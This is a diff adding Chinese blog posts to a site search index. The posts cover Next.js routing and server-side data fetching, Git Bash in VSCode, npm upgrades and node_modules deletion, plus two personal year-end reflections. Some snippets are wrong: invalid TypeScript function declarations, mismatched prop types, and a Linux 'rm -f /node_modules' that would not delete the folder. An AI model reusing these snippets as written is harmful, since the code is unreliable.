+<td><code>&#123;&quot;day&quot;: &quot;2021-01-01&quot;, &quot;name&quot;: &quot;steven&quot;&#125;</code></td>
+</tr>
+</tbody></table>
+<p>可以用 <code>...</code> 匹配多级路由。<br>以 <code>/pages/post/[...path].tsx</code> 为例：</p>
+<table>
+<thead>
+<tr>
+<th>router</th>
+<th>query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/post/a</code></td>
+<td><code>&#123;&quot;path&quot;: [&quot;a&quot;]&#125;</code></td>
+</tr>
+<tr>
+<td><code>/post/b/1</code></td>
+<td><code>&#123;&quot;path&quot;: [&quot;b&quot;, &quot;1&quot;]&#125;</code></td>
+</tr>
+</tbody></table>
+<h2 id="页面数据获取"><a href="#页面数据获取" class="headerlink" title="页面数据获取"></a>页面数据获取</h2><p>Next.js 页面数据获取方法有两种，一是服务端数据获取，一是客户（网页）端异步获取。客户（网页）端异步获取方法和原生 React 框架的常用方法一样，但这种方式在数据爬取的时候往往只能获取页面框架代码，不利于 SEO，所以 Next.js 针对这个问题做了服务端数据获取（服务端渲染）。服务端数据获取的方法是调用 Next.js 暴露的 API，在客户端向前端服务器请求数据后，前端服务器在 Next.js 暴露的 API 对应的生命周期发送数据请求，获取后和网页代码一并返回给客户端。</p>
+<h3 id="服务端数据获取"><a href="#服务端数据获取" class="headerlink" title="服务端数据获取"></a>服务端数据获取</h3><p>Next.js 暴漏了三个 API 供服务端数据获取—— <code>getStaticProps</code>、<br><code>getStaticPaths</code> 和 <code>getServerSideProps</code>。</p>
+<table>
+<thead>
+<tr>
+<th>API</th>
+<th>触发时间</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>getStaticProps</code></td>
+<td>构建（build）时</td>
+<td>在构建时固定，且后面不更改的数据。</td>
+</tr>
+<tr>
+<td><code>getStaticPaths</code></td>
+<td>构建（build）时</td>
+<td>用于动态路由页面，构建时固定，且后面不再更改，需要提供路由列表。</td>
+</tr>
+<tr>
+<td><code>getServerSideProps</code></td>
+<td>向前端服务器请求数据后</td>
+<td>根据路由数据向后端数据库请求数据。</td>
+</tr>
+</tbody></table>
+<h4 id="getStaticProps"><a href="#getStaticProps" class="headerlink" title="getStaticProps"></a>getStaticProps</h4><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">GetStaticProps</span>, <span class="title class_">InferGetServerSidePropsType</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;next&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="attr">getStaticProps</span>: <span class="title class_">GetStaticProps</span>(context) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">props</span>: &#123;&#125;, <span class="comment">// 传递到页面组件</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">Component</span>(<span class="params"> componentProps: InferGetServerSidePropsType&lt;<span class="keyword">typeof</span> getServerSideProps&gt;</span>) &#123;</span><br><span class="line">  <span class="comment">// getStaticProps 返回值中 props 的值会挂载到 componentProps 上</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="getStaticPaths"><a href="#getStaticPaths" class="headerlink" title="getStaticPaths"></a>getStaticPaths</h4><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">GetStaticProps</span>, <span class="title class_">GetStaticPaths</span>, <span class="title class_">InferGetServerSidePropsType</span> &#125; <span class="keyword">from</span> <span class="string">&quot;next&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="attr">getStaticPaths</span>: <span class="title class_">GetStaticPaths</span> = <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">paths</span>: [</span><br><span class="line">      &#123; <span class="attr">params</span>: &#123; <span class="attr">name</span>: <span class="string">&quot;route1&quot;</span> &#125; &#125;,</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">      &#123; <span class="attr">params</span>: &#123; <span class="attr">name</span>: <span class="string">&quot;routen&quot;</span> &#125; &#125;,</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">fallback</span>: <span class="literal">false</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="attr">getStaticProps</span>: <span class="title class_">GetStaticProps</span> = <span class="keyword">async</span> (context) =&gt; &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;context.params.name:&quot;</span>, context.<span class="property">params</span>.<span class="property">name</span>); <span class="comment">// route1 或 route2 ……</span></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">props</span>: &#123;&#125;, <span class="comment">// 传递到页面组件</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">Component</span>(<span class="params"> componentProps: InferGetServerSidePropsType&lt;<span class="keyword">typeof</span> getServerSideProps&gt;</span>) &#123;</span><br><span class="line">  <span class="comment">// getStaticProps 返回值中 props 的值会挂载到 componentProps 上</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="getServerSideProps"><a href="#getServerSideProps" class="headerlink" title="getServerSideProps"></a>getServerSideProps</h3><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">GetServerSideProps</span>, <span class="title class_">InferGetServerSidePropsType</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;next&#x27;</span> <span class="comment">//TypeScript：使用 GetServerSideProps</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="attr">getServerSideProps</span>:<span class="title class_">GetServerSideProps</span> (context) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">props</span>: &#123;&#125;, <span class="comment">// 将作为道具传递到页面组件</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">Component</span>(<span class="params"> componentProps: InferGetServerSidePropsType&lt;<span class="keyword">typeof</span> getServerSideProps&gt;</span>)  &#123;</span><br><span class="line">  <span class="comment">// getServerSideProps 返回值中 props 的值会挂载到 componentProps 上</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="客户（网页）端异步获取"><a href="#客户（网页）端异步获取" class="headerlink" title="客户（网页）端异步获取"></a>客户（网页）端异步获取</h3><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;useEffect&#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">Component</span>(<span class="params"></span>)  &#123;</span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 异步请求……</span></span><br><span class="line">  &#125;, []);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="表单-post-请求数据接收"><a href="#表单-post-请求数据接收" class="headerlink" title="表单 post 请求数据接收"></a>表单 post 请求数据接收</h2><p>这里再介绍一下表单 post 请求传递数据的方法，这种方法适用于将数据从一个页面发送给另一个页面，不经过后端处理。</p>
+<p>当某一个页面向 <code>/post</code> 页面发送表单 post 请求时，下面可实现 <code>/post</code> 页面接收请求数据。</p>
+<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// pages/api/request.ts</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">GetServerSidePropsContext</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;next&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">ReqType</span> = <span class="title class_">GetServerSidePropsContext</span>[<span class="string">&#x27;req&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该方法旨在接收 post 请求数据</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">handleRequestBody</span>(<span class="params">req: ReqType</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> body = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">await</span> (<span class="keyword">const</span> data <span class="keyword">of</span> req) body += data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="title function_">fromEntries</span>(<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(body));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// pages/post/index.tsx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">GetServerSideProps</span>, <span class="title class_">InferGetServerSidePropsType</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;next&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; handleRequestBody &#125; <span class="keyword">from</span> <span class="string">&#x27;../api/request&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="attr">getServerSideProps</span>: <span class="title class_">GetServerSideProps</span> = <span class="keyword">async</span> (&#123;</span><br><span class="line">    req,</span><br><span class="line">    <span class="attr">query</span>: &#123; id &#125;,</span><br><span class="line">&#125;) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> postReq = (<span class="keyword">await</span> <span class="title function_">handleRequestBody</span>(req)) || &#123;&#125;;</span><br><span class="line">    <span class="comment">// 此处可根据接收的数据做一些处理……</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">props</span>: &#123;&#125;, <span class="comment">// 返回给渲染组件</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">Post</span>(<span class="params"> ComponentProps: InferGetServerSidePropsType&lt;<span class="keyword">typeof</span> getServerSideProps&gt;</span>) &#123;</span><br><span class="line">  <span class="comment">// getServerSideProps 返回值中 props 的值会挂载到 componentProps 上</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p><strong>参考资料</strong></p>
+<ul>
+<li><a href="https://www.jianshu.com/p/9172f1d560c6">Next.js 静态生成和服务器端渲染</a></li>
+<li><a href="https://nextjs.org/docs/basic-features/data-fetching/get-server-side-props">getServerSideProps</a></li>
+<li><a href="https://nextjs.org/docs/basic-features/data-fetching/get-static-paths">getStaticPaths</a></li>
+<li><a href="https://nextjs.org/docs/basic-features/data-fetching/get-static-props">getStaticProps</a></li>
+<li><a href="https://github.com/maxwilsonpereira/NextJS_Basics/blob/a807090cec703d4a892d88f650b7cc75f52eacfb/src/pages/getStaticPaths/%5Bname%5D.tsx#L37">NextJS_Basics&#x2F;src&#x2F;pages&#x2F;getStaticPaths&#x2F;[name].tsx</a></li>
+</ul>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Next.js</category>
+      </categories>
+      <tags>
+        <tag>Next.js</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows 环境下在 VSCode 中使用 Git Bash 终端</title>
+    <url>/blog/20210811-use-git-bash-with-vscode-v1-59-0/</url>
+    <content><![CDATA[<p>目前，想要在 Windows 环境下使用 Bash shell，似乎 Git Bash 是最佳选择，也是唯一选择。但是之前的配置教程大多伴随 VSCode 升级而失效，这里将踩坑的经验记录一下。</p>
+<span id="more"></span>
+
+<h2 id="安装-Git-Bash-和-VSCode"><a href="#安装-Git-Bash-和-VSCode" class="headerlink" title="安装 Git Bash 和 VSCode"></a>安装 Git Bash 和 VSCode</h2><p>想要安装 Git Bash 只需安装 <a href="https://git-scm.com/download/win">Git</a> 即可，安装过程略。</p>
+<h2 id="寻找-Git-Bash-的-bin-目录地址"><a href="#寻找-Git-Bash-的-bin-目录地址" class="headerlink" title="寻找 Git Bash 的 bin 目录地址"></a>寻找 Git Bash 的 bin 目录地址</h2><p>在本地找到 Git 安装的目录，根目录下有一个 <code>bin</code> 文件夹，<code>bin</code> 文件夹下有一个 <code>bash.exe</code> 文件，该 <code>bash.exe</code> 文件的绝对路径即为所寻找的目录地址。</p>
+<blockquote>
+<p><strong>注意：</strong> 在 Git 安装的根目录下有一个 <code>git-bash.exe</code> 文件，如果下面配置采用该文件的绝对路径，则启动终端时会另外启动一个 Git Bash 窗口。</p>
+</blockquote>
+<h2 id="为-VSCode-配置-Git-Bash-终端"><a href="#为-VSCode-配置-Git-Bash-终端" class="headerlink" title="为 VSCode 配置 Git Bash 终端"></a>为 VSCode 配置 Git Bash 终端</h2><p>进入 VSCode &gt; “管理” &gt; “设置”（setting）：</p>
+<p>搜索 <code>terminal.integrated.profiles.windows</code>，点击 <code>在 setting.json 中编辑</code>（这里以 Git Bash 的 bin 路径为 <code>C:\Program Files\Git\bin\bash.exe</code> 为例）：</p>
+<figure class="highlight diff"><figcaption><span>setting.json</span></figcaption><table><tr><td class="code"><pre><span class="line">        &quot;terminal.integrated.profiles.windows&quot;: &#123;</span><br><span class="line">            &quot;PowerShell&quot;: &#123;</span><br><span class="line">                &quot;source&quot;: &quot;PowerShell&quot;,</span><br><span class="line">                &quot;icon&quot;: &quot;terminal-powershell&quot;</span><br><span class="line">            &#125;,</span><br><span class="line"><span class="addition">+           &quot;Git-Bash&quot;: &#123;</span></span><br><span class="line"><span class="addition">+                &quot;path&quot;: &quot;C:\\Program Files\\Git\\bin\\bash.exe&quot;</span></span><br><span class="line"><span class="addition">+            &#125;,</span></span><br><span class="line">         &#125;,</span><br></pre></td></tr></table></figure>
+
+<p>保存文件，重启即生效。</p>
+<h2 id="将-Git-Bash-设为-VSCode-的默认终端（可选）"><a href="#将-Git-Bash-设为-VSCode-的默认终端（可选）" class="headerlink" title="将 Git Bash 设为 VSCode 的默认终端（可选）"></a>将 Git Bash 设为 VSCode 的默认终端（可选）</h2><p>在上述文件 <code>setting.json</code> 文件增加 <code>&quot;terminal.integrated.defaultProfile.windows&quot;: &quot;Git-Bash&quot;</code>：</p>
+<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">        &quot;terminal.integrated.profiles.windows&quot;: &#123;</span><br><span class="line">            &quot;PowerShell&quot;: &#123;</span><br><span class="line">                &quot;source&quot;: &quot;PowerShell&quot;,</span><br><span class="line">                &quot;icon&quot;: &quot;terminal-powershell&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;Git-Bash&quot;: &#123;</span><br><span class="line">                &quot;path&quot;: &quot;C:\\Program Files\\Git\\bin\\bash.exe&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="addition">+       &quot;terminal.integrated.defaultProfile.windows&quot;: &quot;Git-Bash&quot;,</span></span><br></pre></td></tr></table></figure>
+
+<p>保存文件，重启即生效。</p>
+]]></content>
+      <categories>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>环境搭建</tag>
+        <tag>Git Bash</tag>
+        <tag>VSCode</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>总结 2019，展望 2020</title>
+    <url>/blog/20200101-year-end-summary-2019/</url>
+    <content><![CDATA[<blockquote>
+<p>这是我的公众号第一篇推送。<br>微信公众号首发。</p>
+</blockquote>
+<p>2019年匆匆过了，这一年经历过许多不同形式离别，也注定会经历离别。</p>
+<span id="more"></span>
+
+<h2 id="一年流水帐"><a href="#一年流水帐" class="headerlink" title="一年流水帐"></a>一年流水帐</h2><p>年初，考完研感觉非常不好，所以一直在着手找工作的事，一边准备大学最后一次期末考试，一边准备一家公司的面试，自己第一次用 Node.js 写了一个面试题，由于自己不熟 API，感谢杰哥的点拨，也感谢亦乐和谷大佬的帮助和推荐。</p>
+<p>由于开学初院系为大四组织了一个月的专业实习 <del>（当然我没参加）</del>，所以我们晚于自己学院同年级其他专业放寒假。一月中旬，准备好材料，整理好寝室的物品，告别室友，踏上了回家的路……吉林——长春——北京——长沙，见了一路朋友，告别了一路朋友。买错票，幸好可以中途在长春上车。总喜欢在北京倒车，四处逛逛，第一次喝豆汁，吃焦圈，品艾窝窝……在长沙约了朋友见面，可惜茶颜营业时间太晚，只好坐在星巴克聊天，错过了今年一次喝茶颜的机会。</p>
+<p>到家后，去了趟城西南的旧居，那片老城区已经被拆得面目全非，独留旧居倚在寺庙边，我站在废墟里独自流泪，怀念人生最初的十年，那些人那些事，也许正是这种离别的滋味使我成长。</p>
+<p>年节后一直在家学习 Vue.js、Element UI，做了一个小 Demo。3 月中旬，去北京碰碰运气，接到了一个面试 <del>（人生第一次工作面试，挂了）</del>。在京的一周，“水”了二三年的群被群主解散了，好在之前有预备方案，只可惜群资料没来得及备份，离别旧群，迎接新群。下旬，没有找到工作，回到学校，正好市创业园有个培训，包分配，前面一连串的打击，使我不得不抓住这根“稻草”，四月初，室友豪哥和杰哥送我到培训的地方，计划三个月的培训开始了，在搬行李的那天下午，拔了牙，吃了一周流食。</p>
+<p>五月开始，一直往返于培训地和学校，工作日在培训地，周末在学校。培训压力一直很大，每周一小测，每门课学完一大测。六月初，去公司分配开发部，公司允假答辩完再回公司办入职手续，可惜正好那天错过了毕业照。</p>
+<p>今年的七月是一个悲伤的季节，一一送别两位室友，离别学校。这次离别意味着我 20 多年校园生活告一段落，全新的生活正式开始，这是我人生一大转折点。</p>
+<p>毕业典礼的后一天，正式入职。工作一个月后搬出培训期间的筒子楼，出去独居，公司和居所距离步行二十分钟左右的路程，两点一线，简单又充实。十二月去江南陵园送别一位年轻的大学老师，深有“人事两茫茫”之感。</p>
+<h2 id="一年小结"><a href="#一年小结" class="headerlink" title="一年小结"></a>一年小结</h2><p>2019 年是我在人生路上一个重要的节点，在这个节点离开学校，走上了工作岗位，永远的告别了一些人，做了一些选择，留下了许多遗憾。</p>
+<p>一年以来，由于各种原因很少花时间看书，看完的书推荐《颠覆者：周鸿祎自传》，在潘家园旧书摊淘的一本旧书，毕业时送人了，前不久在微信读书把书中提到的书目再整理了一次，书中许多对商业模式的思考和秘辛值得闲暇时一看。</p>
+<p>感谢在过去的一年里帮助过我的朋友们，这里就不一一道谢了，祝福大家。</p>
+<h2 id="一年期待"><a href="#一年期待" class="headerlink" title="一年期待"></a>一年期待</h2><p>农历明年是我的本命年，希望一切平顺，也希望明年各位亲朋好友健康快乐。</p>
+<p>希望技术上能跟进目前的主流技术，也能补足基础短板；希望能多花时间看点书；希望能多出点作品（2019 年几乎没写）；希望打理的公众号能多涨点粉 <del>（不是这个公众号）</del>；希望把 fCC 吉林社区正式运营起来；希望有时间能成为一个 UP 主。</p>
+]]></content>
+      <categories>
+        <category>年终总结</category>
+      </categories>
+      <tags>
+        <tag>年终总结</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Node.js 升级依赖包和快速删除 node_modules</title>
+    <url>/blog/20210122-upgrade-dependent-package-and-fast-deletion-node-modules/</url>
+    <content><![CDATA[<p>很久之前的一个仓库，原本不想维护了，GitHub 经常发送安全警告，主要是 npm 依赖版本过低，这次想升级一下 npm 的依赖。记录一下方法。</p>
+<span id="more"></span>
+
+<h2 id="查询版本可更新的版本"><a href="#查询版本可更新的版本" class="headerlink" title="查询版本可更新的版本"></a>查询版本可更新的版本</h2><p>可以安装 npm-check-updates 模块：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g npm-check-updates</span><br></pre></td></tr></table></figure>
+<p>可以执行下面的对依赖进行检查（二选一）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ncu</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">npm-check-updates</span><br></pre></td></tr></table></figure>
+<p>不建议用 <code>ncu -u</code> 将所有模块更新到最新版本，应选择性更新，减少应更新依赖而导致的错误。</p>
+<h2 id="执行更新"><a href="#执行更新" class="headerlink" title="执行更新"></a>执行更新</h2><p>修改 package.json ，使不同模块到对应版本。<br>执行下面的 npm 命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm update xxx</span><br></pre></td></tr></table></figure>
+
+<p>xxx 是 指定的模块名，可以根据作用范围在后面加上 -D、-S 或 -g</p>
+<p>package.json 更新后，可删除整个 node_modules 目录并重新安装依赖包。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="快速删除-node-modules-的方法"><a href="#快速删除-node-modules-的方法" class="headerlink" title="快速删除 node_modules 的方法"></a>快速删除 node_modules 的方法</h2><h3 id="方法一：使用-rimraf-模块"><a href="#方法一：使用-rimraf-模块" class="headerlink" title="方法一：使用 rimraf 模块"></a>方法一：使用 rimraf 模块</h3><p>全局安装 rimraf 模块</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install rimraf -g</span><br></pre></td></tr></table></figure>
+
+<p>通过 rimraf 模块命令来快速删除node_modules目录</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rimraf node_modules</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法二：使用系统命令来删除目录"><a href="#方法二：使用系统命令来删除目录" class="headerlink" title="方法二：使用系统命令来删除目录"></a>方法二：使用系统命令来删除目录</h3><p>Windows：<br>在 cmd 窗口中进入到 node_modules 文件夹所在的路径：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rmdir</span> /s/q node_modules</span><br></pre></td></tr></table></figure>
+
+<p>Linux：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -f /node_modules</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>参考资料</strong></p>
+<ul>
+<li><a href="https://www.jianshu.com/p/9b9166f7559c">npm 依赖包的安装、更新、删除</a></li>
+<li><a href="https://www.cnblogs.com/yulinlewis/p/10441181.html">快速删除node_modules文件夹</a></li>
+</ul>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Node.js</category>
+      </categories>
+      <tags>
+        <tag>Node.js</tag>
+        <tag>npm</tag>
+        <tag>node_modules</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2020 年小结——又是一年流水账</title>
+    <url>/blog/20220101-year-end-summary-2020/</url>
+    <content><![CDATA[<blockquote>
+<p>微信公众号首发。</p>
+</blockquote>
+<p>2020 年大体想来，除了工作，其他的事情几乎无一可写。</p>
+<span id="more"></span>
+
+<p>年初的疫情搅乱了所有的计划，无论是我个人还是这个世界上的其他人无一幸免，生逢于此，见证了世界格局的变化，舆论的涨跌，不知是幸运还是不幸。</p>
+<p>去年 12 月份转到了新的组，1 月份工作相对轻松，在春节前甲方特地开会，强调因为工期紧，春节前可以请假，春节后不可以请假，工作强度预计是 996。由于之前并无经验，所以对 996 并无感。</p>
+<p>父母考虑我过年不回家，于是在 19 年底寄了一些糍粑，以缓解我的思乡之苦，在春节前几天的烹制过程中，由于不当操作导致溅出来的油在脸上和手上烫出小泡来，买了口罩和烫伤药，没想到，这些口罩在后面疫情爆发期间发挥了不少作用，虽然防护等级不高，也确实聊胜于无。</p>
+<p>1 月 23 日，农历十二月廿八，除夕的前一天，己亥年的最后一个工作日，在中午吃饭时刷到了一位武汉朋友的年终总结，从其中我才知道他要在武汉封城前回到自己的家乡——武汉要封城了！在之前，我没有回家过年的计划，有时常在想，或许，这让我逃过一劫吧（武汉是我返乡的必经之路）。下午突然腹泻让我神经一紧，公司提前至 15:00 下班，我连忙赶往附近的社区医院诊疗，可能是中午楼下食堂不营业而点了份麻辣烫的原因。这种不适一直延续到了初五左右。回家后一直刷微博来了解疫情前线的情况，越刷越焦虑，幸好还有几个好友组了麻将局和狼人杀局来消遣这种精神上强烈的不适。</p>
+<p>初七之后政府又延长了春节假期，春节假期后开始了疯狂的加班模式。这段时间的加班 10:00 以后下班是常有的事，偶尔一两次到了凌晨，也算见过凌晨的写字楼和空旷的街道。三月份项目逐渐接近尾声，偶尔修修 bug，可因为往往 bug 反馈晚，要得急，偶尔也要加班，只是频率小了很多。</p>
+<p>四月底，调出了 Java 项目组，做 Cobol 项目。一边学 Cobol，一边做些脚本。五月疫情席卷吉林市，出现阳性的小区和写字楼不过 5 分钟路程（有的同事居住的小区也出现阳性了，当然同事也被隔离了），公司正常上班，没有同事染疫，事后公司也给了近一个月工资的补贴。Cobol 项目并不轻松，也时常加班，每次下班都天黑了。有一次团队聚餐，才有幸见到夕阳，那日从民生书局淘得一本翼云先生的诗稿，十分开心。</p>
+<p>项目接近尾声后，又换组写了几周项目，也是加班，幸好还有其他同事（我大学同学，后来一起来公司的）的帮助，才能把分配给我的任务勉勉强强做完，期间还参与了 9 月份团建和一次部门聚餐。</p>
+<p>之后又回到原来的组写新项目，意外接手了一个严重 bug 的调查，新来的外包同事主张的调查做法并不认同，当着领导的面起了冲突，由于领导信任新来同事的经验，按照他们商议的方案行事，后来分给我的部分由于太难太多，没有按时做完。deadline 是周五，周五是公司旅游的出发日，下午项目没有结束，中午交接给了其他没有旅游的同事，吃晚饭的时候，领导打电话回公司知道项目已经顺利结束了，稍稍松了口气。跟着公司去了趟长白山，住了酒店，看了雪山风光，体验了朝鲜族风情和美食，还得到了一份长白山特产，唯一遗憾是因为天气原因没有开放天池的浏览。这次旅行算是给紧张的生活一点放松吧。</p>
+<p>长白山回来后，继续写新项目，自然也是加班。不久，家里来消息，表姐在明年元月上旬结婚，希望我回家，加之离家太远，多不方便，希望辞职。在家里的反复敦促之下，准备在周五提交辞职信，又和部门聚餐时间重合了，为了不影响大家的情绪，只好周一联系领导了。</p>
+<p>离职的时间比预期要早，没到一个月，项目进入尾声，领导提前一周通知我可以离职，后来陆续交接工作，走离职流程，就这样结束了我人生第一份工作。感谢这一路以来关心和帮助我的老师、领导、同事、同学、宿管阿姨……（关于第一份工作的事情，有时间再复盘吧。）</p>
+<p>离职后的一周里，除了等公司 hr 小姐姐给我发辞职证明，就是处理养老保险和医保的问题，还有和我五年半在吉林生活而购买的物品做离断舍。一部分寄回家；剩下的大部分生活用品送给了在隔壁楼居住的两位同事，一部的给了楼下超市的晓宏姐，剩下的一地鸡毛留给了房东，感谢房东最后大半个月没有收我的房租。</p>
+<p>在这一周里，还有很多事没有来得及做，如逛逛文庙和附近的旧书摊，也来不及去居住地不过十几分钟步行路程的公园逛一下……时间太紧，加上疫情已经有了苗头，只好匆匆作别，原本的计划逛一圈北京，可是北京又查出阳性，只好改在山海关换乘。</p>
+<p>终于在离开家一年多后回到了魂牵梦萦的家。回到家后自然是休整一段时间，也就过完了我的 2020。</p>
+]]></content>
+      <categories>
+        <category>年终总结</category>
+      </categories>
+      <tags>
+        <tag>年终总结</tag>
+      </tags>
+  </entry>
+</search>
